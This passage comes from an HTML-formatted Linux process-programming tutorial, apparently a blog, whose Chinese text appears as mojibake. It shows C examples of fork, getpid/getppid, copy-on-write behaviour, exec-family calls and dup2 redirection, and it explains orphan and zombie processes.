class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"before fork-1---\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"before fork-2---\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"before fork-3---\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"before fork-4---\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">pid_t</span> pid = fork();</span><br><span class="line"><span class="keyword">if</span> (pid == <span class="number">-1</span>) &#123;</span><br><span class="line">perror(<span class="string">"fork error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"----child is created\n"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span> )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"----parent process: my child is %d\n"</span>,pid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"=============end of file\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="getpid"><a href="#getpid" class="headerlink" title="getpid"></a>getpid</h5><p>è·å–å­è¿›ç¨‹</p><h5 id="getppid"><a href="#getppid" class="headerlink" title="getppid"></a>getppid</h5><p>è·å–çˆ¶è¿›ç¨‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"before fork-1---\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"before fork-2---\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"before fork-3---\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"before fork-4---\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">pid_t</span> pid = fork();</span><br><span class="line"><span class="keyword">if</span> (pid == <span class="number">-1</span>) &#123;</span><br><span class="line">perror(<span class="string">"fork error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"----child is created,pid=%d,parent-pid=%d\n"</span>,getpid(),getppid());</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span> )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"----parent process: my child is %d,my pid:%d,my parent pid:%d\n"</span>,pid,getpid(),getppid());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"=============end of file\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œä»£ç åå‘ç°ç»“æœå¦‚ä¸‹ï¼Œåœ¨å­è¿›ç¨‹ä¸­å¾—åˆ°çš„çˆ¶è¿›ç¨‹çš„pidä¸º1ã€‚æŒ‰ç†åº”è¯¥å¾—åˆ°çš„ç»“æœæ˜¯21237æ‰å¯¹ã€‚æœ€åæŸ¥é˜…ç›¸å…³ä¿¡æ¯å‘ç°ï¼Œç”±äºçˆ¶è¿›ç¨‹å…ˆé€€å‡ºäº†ï¼Œé€ æˆäº†å­è¿›ç¨‹è¢«<code>init(ID=1)</code>æ¥ç®¡ï¼Œæ‰€ä»¥å¾—åˆ°çš„ç»“æœæ˜¯1ã€‚è¿™é‡Œé‡‡ç”¨çš„è§£å†³åŠæ³•æ˜¯åœ¨çˆ¶è¿›ç¨‹ä¸­sleepå‡ ç§’ï¼Œè®©çˆ¶è¿›ç¨‹æ™šäºå­è¿›ç¨‹ç»“æŸå³å¯ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">before fork-1---</span><br><span class="line">before fork-2---</span><br><span class="line">before fork-3---</span><br><span class="line">before fork-4---</span><br><span class="line">----child is created,pid=21238,parent-pid=1</span><br><span class="line">=============end of file</span><br><span class="line">----parent process: my child is 21238,my pid:21237,my parent pid:15776</span><br><span class="line">=============end of file</span><br></pre></td></tr></table></figure><h5 id="å¾ªç¯åˆ›å»ºå¤šä¸ªå­è¿›ç¨‹"><a href="#å¾ªç¯åˆ›å»ºå¤šä¸ªå­è¿›ç¨‹" class="headerlink" title="å¾ªç¯åˆ›å»ºå¤šä¸ªå­è¿›ç¨‹"></a>å¾ªç¯åˆ›å»ºå¤šä¸ªå­è¿›ç¨‹</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++) &#123;</span><br><span class="line"><span class="keyword">if</span>(fork() == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i==<span class="number">5</span>)&#123;</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"I'm parent\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"I'm %dth child\n"</span>,i+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="getuid"><a href="#getuid" class="headerlink" title="getuid"></a>getuid</h5><p>è·å–ç”¨æˆ·id</p><h5 id="getgid"><a href="#getgid" class="headerlink" title="getgid"></a>getgid</h5><p>è·å–ç»„id</p><h5 id="è¿›ç¨‹å…±äº«"><a href="#è¿›ç¨‹å…±äº«" class="headerlink" title="è¿›ç¨‹å…±äº«"></a>è¿›ç¨‹å…±äº«</h5><p>çˆ¶å­è¿›ç¨‹ä¹‹é—´åœ¨forkåï¼Œæœ‰å“ªäº›å¼‚åŒ</p><p>åˆšforkä¹‹åï¼Œç›¸åŒä¹‹å¤„ï¼Œå…¨å±€å˜é‡ã€<code>.data</code>ã€<code>.text</code>ã€æ ˆã€å †ã€ç¯å¢ƒå˜é‡ã€ç”¨æˆ·IDã€å®¿ä¸»ç›®å½•ã€è¿›ç¨‹å·¥ä½œç›®å½•ã€ä¿¡å·å¤„ç†æ–¹å¼</p><p>ä¸åŒä¹‹å¤„ï¼Œè¿›ç¨‹IDï¼Œforkè¿”å›å€¼ï¼Œå„è‡ªçš„çˆ¶è¿›ç¨‹IDï¼Œè¿›ç¨‹è¿è¡Œæ—¶é—´ï¼Œé—¹é’Ÿ(å®šæ—¶å™¨)ï¼Œæœªå†³ä¿¡å·é›†</p><p>é€šè¿‡ç¨‹åºåˆ¤æ–­çˆ¶å­è¿›ç¨‹æ˜¯å¦å…±äº«å…¨å±€å˜é‡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> var = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span> (pid == <span class="number">-1</span>)&#123;</span><br><span class="line">perror(<span class="string">"fork error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">var = <span class="number">200</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"I'm child pid=%d,ppid=%d\n"</span>,getpid(),getppid());</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"child,var = %d\n"</span>,var);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span> )&#123;</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">var = <span class="number">288</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"parent,var = %d\n"</span>,var);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"--I'm parent pid= %d,getppid = %d\n"</span>,getpid(),getppid());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"=======finish======\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">I'm child pid=23313,ppid=23312</span><br><span class="line">child,var = 200</span><br><span class="line">=======finish======</span><br><span class="line">parent,var = 288</span><br><span class="line">--I'm parent pid= 23312,getppid = 15776</span><br><span class="line">=======finish======</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥å¾—åˆ°ç»“è®ºï¼Œçˆ¶å­è¿›ç¨‹é—´éµå¾ª<strong>è¯»æ—¶å…±äº«å†™æ—¶å¤åˆ¶</strong>çš„åŸåˆ™ï¼Œè¿™æ ·è®¾è®¡ï¼Œæ— è®ºå­è¿›ç¨‹æ‰§è¡Œçˆ¶è¿›ç¨‹çš„é€»è¾‘è¿˜æ˜¯æ‰§è¡Œè‡ªå·±çš„é€»è¾‘éƒ½èƒ½èŠ‚çœå†…å­˜å¼€é”€ã€‚</p><p>çˆ¶å­è¿›ç¨‹å…±äº«</p><ul><li>æ–‡ä»¶æè¿°ç¬¦ï¼ˆæ‰“å¼€æ–‡ä»¶çš„ç»“æ„ä½“ï¼‰</li><li>mmapå»ºç«‹çš„æ˜ å°„åŒº</li></ul><h5 id="gdbè°ƒè¯•çˆ¶å­è¿›ç¨‹"><a href="#gdbè°ƒè¯•çˆ¶å­è¿›ç¨‹" class="headerlink" title="gdbè°ƒè¯•çˆ¶å­è¿›ç¨‹"></a>gdbè°ƒè¯•çˆ¶å­è¿›ç¨‹</h5><p>æ³¨æ„ä»¥ä¸‹ä¸¤ç§è®¾ç½®åœ¨forkå‡½æ•°è°ƒç”¨ä¹‹å‰æ‰æœ‰æ•ˆ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set follow-fork-mode child #å‘½ä»¤è®¾ç½®gdbåœ¨forkä¹‹åè·Ÿè¸ªå­è¿›ç¨‹</span><br><span class="line">set follow-fork-mode parent #è®¾ç½®è·Ÿè¸ªçˆ¶è¿›ç¨‹</span><br></pre></td></tr></table></figure><h4 id="execå‡½æ•°æ—"><a href="#execå‡½æ•°æ—" class="headerlink" title="execå‡½æ•°æ—"></a>execå‡½æ•°æ—</h4><p>è¯¥å‡½æ•°æ—å¯ä»¥å°†å½“å‰è¿›ç¨‹çš„<code>.text</code>ã€<code>.data</code>æ›¿æ¢ä¸ºæ‰€è¦åŠ è½½çš„ç¨‹åºçš„<code>.text</code>ã€<code>.data</code>ï¼Œç„¶åè®©è¿›ç¨‹ä»æ–°çš„<code>.text</code>ç¬¬ä¸€æ¡æŒ‡ä»¤å¼€å§‹æ‰§è¡Œï¼Œä½†è¿›ç¨‹IDä¸å˜ï¼Œæ¢æ ¸ä¸æ¢å£³ã€‚</p><h5 id="execlpå‡½æ•°"><a href="#execlpå‡½æ•°" class="headerlink" title="execlpå‡½æ•°"></a>execlpå‡½æ•°</h5><p>åŠ è½½ä¸€ä¸ªè¿›ç¨‹ï¼Œå€ŸåŠ©PATHç¯å¢ƒå˜é‡</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int execlp(const char *file,const char *arg,...) #æˆåŠŸï¼šæ— è¿”å› å¤±è´¥ï¼šè¿”å›-1</span><br><span class="line">å‚æ•°1:è¦åŠ è½½çš„ç¨‹åºçš„åå­—</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨execlpå‡½æ•°æ‰§è¡Œ<code>ls</code>å‘½ä»¤</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pid_t</span> pid = fork();</span><br><span class="line"><span class="keyword">if</span> (pid == <span class="number">-1</span>) &#123;</span><br><span class="line">perror(<span class="string">"fork error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">//execlp("ls","-l","-d","-h",NULL); #é”™è¯¯å†™æ³•</span></span><br><span class="line">execlp(<span class="string">"ls"</span>,<span class="string">"ls"</span>,<span class="string">"-l"</span>,<span class="string">"-h"</span>,<span class="literal">NULL</span>);</span><br><span class="line">perror(<span class="string">"exec error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span> )&#123;</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"I'm parent:%d\n"</span>,getpid());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="execlå‡½æ•°"><a href="#execlå‡½æ•°" class="headerlink" title="execlå‡½æ•°"></a>execlå‡½æ•°</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int execl(const char *path,const char *arg,...)  #æˆåŠŸï¼šæ— è¿”å› å¤±è´¥ï¼šè¿”å›-1</span><br><span class="line">å‚æ•°1:ç»å¯¹è·¯å¾„</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨execlå‡½æ•°æ‰§è¡Œä¸€ä¸ª<code>a.out</code>æ–‡ä»¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pid_t</span> pid = fork();</span><br><span class="line"><span class="keyword">if</span> (pid == <span class="number">-1</span>) &#123;</span><br><span class="line">perror(<span class="string">"fork error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">execl(<span class="string">"./a.out"</span>,<span class="string">"./a.out"</span>,<span class="literal">NULL</span>);</span><br><span class="line">perror(<span class="string">"exec error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span> )&#123;</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"I'm parent:%d\n"</span>,getpid());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="ç»„åˆç»ƒä¹ "><a href="#ç»„åˆç»ƒä¹ " class="headerlink" title="ç»„åˆç»ƒä¹ "></a>ç»„åˆç»ƒä¹ </h5><p>å°†<code>ps</code>å‘½ä»¤æ‰§è¡Œåçš„ç»“æœå†™å…¥<code>ps.out</code>æ–‡ä»¶ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line">fd = open(<span class="string">"ps.out"</span>,O_WRONLY|O_CREAT|O_TRUNC,<span class="number">0644</span>);</span><br><span class="line"><span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">perror(<span class="string">"open ps.out error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dup2(fd,STDOUT_FILENO);</span><br><span class="line">execlp(<span class="string">"ps"</span>,<span class="string">"ps"</span>,<span class="string">"aux"</span>,<span class="literal">NULL</span>);</span><br><span class="line">perror(<span class="string">"execlp error"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="execå‡½æ•°æ—ä¸€èˆ¬è§„å¾‹"><a href="#execå‡½æ•°æ—ä¸€èˆ¬è§„å¾‹" class="headerlink" title="execå‡½æ•°æ—ä¸€èˆ¬è§„å¾‹"></a>execå‡½æ•°æ—ä¸€èˆ¬è§„å¾‹</h5><p>execå‡½æ•°ä¸€æ—¦è°ƒç”¨æˆåŠŸå³æ‰§è¡Œæ–°çš„ç¨‹åºï¼Œä¸è¿”å›ã€‚åªæœ‰å¤±è´¥æ‰è¿”å›ï¼Œé”™è¯¯å€¼-1ã€‚æ‰€ä»¥é€šå¸¸æˆ‘ä»¬ç›´æ¥åœ¨execå‡½æ•°è°ƒç”¨åç›´æ¥è°ƒç”¨<code>perror()</code>å’Œ<code>exit()</code>ï¼Œæ— éœ€ifåˆ¤æ–­ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">l(<span class="built_in">list</span>) å‘½ä»¤è¡Œå‚æ•°åˆ—è¡¨</span><br><span class="line">p(path) æœç´¢fileæ—¶ä½¿ç”¨pathå˜é‡</span><br><span class="line">v(<span class="built_in">vector</span>) ä½¿ç”¨å‘½ä»¤è¡Œå‚æ•°æ•°ç»„</span><br><span class="line">e(enviroment) ä½¿ç”¨ç¯å¢ƒå˜é‡æ•°ç»„</span><br></pre></td></tr></table></figure><h4 id="å›æ”¶å­è¿›ç¨‹"><a href="#å›æ”¶å­è¿›ç¨‹" class="headerlink" title="å›æ”¶å­è¿›ç¨‹"></a>å›æ”¶å­è¿›ç¨‹</h4><h5 id="å­¤å„¿è¿›ç¨‹"><a href="#å­¤å„¿è¿›ç¨‹" class="headerlink" title="å­¤å„¿è¿›ç¨‹"></a>å­¤å„¿è¿›ç¨‹</h5><p>çˆ¶è¿›ç¨‹å…ˆäºå­è¿›ç¨‹ç»“æŸï¼Œåˆ™å­è¿›ç¨‹ç§°ä¸ºå­¤å„¿è¿›ç¨‹ï¼Œå­è¿›ç¨‹çš„çˆ¶è¿›ç¨‹ç§°ä¸º<code>init</code>è¿›ç¨‹ï¼Œç§°ä¸º<code>init</code>è¿›ç¨‹é¢†å…»å­¤å„¿è¿›ç¨‹</p><h5 id="åƒµå°¸è¿›ç¨‹"><a href="#åƒµå°¸è¿›ç¨‹" class="headerlink" title="åƒµå°¸è¿›ç¨‹"></a>åƒµå°¸è¿›ç¨‹</h5><p>è¿›ç¨‹ç»ˆæ­¢ï¼Œçˆ¶è¿›ç¨‹å°šæœªå›æ”¶ï¼Œå­è¿›ç¨‹æ®‹ç•™èµ„æº(PCB)å­˜æ”¾äºå†…æ ¸ä¸­ï¼Œå˜æˆåƒµå°¸(Zombie)è¿›ç¨‹</p><h5 id="waitå‡½æ•°"><a href="#waitå‡½æ•°" class="headerlink" title="waitå‡½æ•°"></a>waitå‡½æ•°</h5><p>ä¸€ä¸ªè¿›ç¨‹åœ¨ç»ˆæ­¢æ—¶ä¼šå…³é—­æ‰€æœ‰æ–‡ä»¶æè¿°ç¬¦ï¼Œé‡Šæ”¾åœ¨ç”¨æˆ·ç©ºé—´åˆ†é…çš„å†…å­˜ï¼Œä½†ä»–çš„PCBè¿˜ä¿ç•™ç€ï¼Œå†…æ 